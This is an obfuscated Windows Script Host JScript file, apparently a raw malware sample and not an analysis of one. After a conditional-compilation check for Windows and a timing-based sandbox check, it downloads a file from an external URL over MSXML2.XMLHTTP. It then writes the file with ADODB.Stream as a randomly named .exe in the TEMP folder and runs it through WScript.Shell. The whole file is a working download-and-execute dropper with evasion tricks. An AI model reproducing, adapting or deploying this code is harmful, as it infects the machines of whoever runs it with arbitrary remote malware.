var q = false;
var Bq = "CreateObject";
var v0 = function MB() {return WScript[Bq]("WScript.Shell");}(), Z1 = 11;
var AN = "MSXML2.XMLHTTP";
var az = 2123213;
var xP = 0;
function zk(Hs){v0["Run"](Hs, xP, xP);};
function N(){return "" + AN;};
function z(T, yN){xP = xP * 1; return T - yN;};
function X(){return Bq;};
/*@cc_on
  @if (@_win32 || @_win64)
    q = true;
  @end
@*/
if (q)
{
var d = "";
function AS(){return 22;};
var dT = 0; var lj = 0;
function u()
{
var cr = new this["Date"]();
var s = cr["getUTCMilliseconds"]();
WScript["Sleep"](AS());
var cr = new this["Date"]();
var U = cr["getUTCMilliseconds"]();
WScript["Sleep"](AS());
var cr = new this["Date"]();
var sb = cr["getUTCMilliseconds"]();
var dT = "RT";
dT = z(U, s);
var lj = "v";
lj = z(sb, U);
d = "open";
return z(dT, lj);
}
var BD = false;
var Cj = false;
for (var Z0 = xP; Z0 < AS() * 1; Z0++){if (u() != xP){
BD = true; 
lj = "31" + 11 * dT + lj; 
Cj = true; 
break;
}}
function o() {return ((BD == true) && (BD == Cj)) ? 1 : xP;};
if (BD && o() && Cj){
function V() {return v0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "eW4cA8yUD5CCw18.exe";};
 S = N();
 d0 = WScript[Bq](S);
 var Z = 1;
 while (Z){
try {
d0[d]("GET", "http://blog.saletron.net/li9soz", false);
d0["send"]();
k = "Sleep";
for (;;){WScript[k](AS() * 11); if (d0["readystate"] >= 2 * 2) break;};
Z = xP;
} catch(rE){};
}
function Ul(V0) {var y = (1, 2, 3, 4, 5, V0); return y;};
Iz = WScript[X()]("ADODB.Stream");
S = Iz;
S[d]();
S["type"] = Ul(1);
S["write"](d0["ResponseBody"]);
Iz["position"] = Ul(xP);
S["Save" + "ToFile"](V(), 2);
Iz["c"+"lose"]();
B = V();
zk(B);
}
}

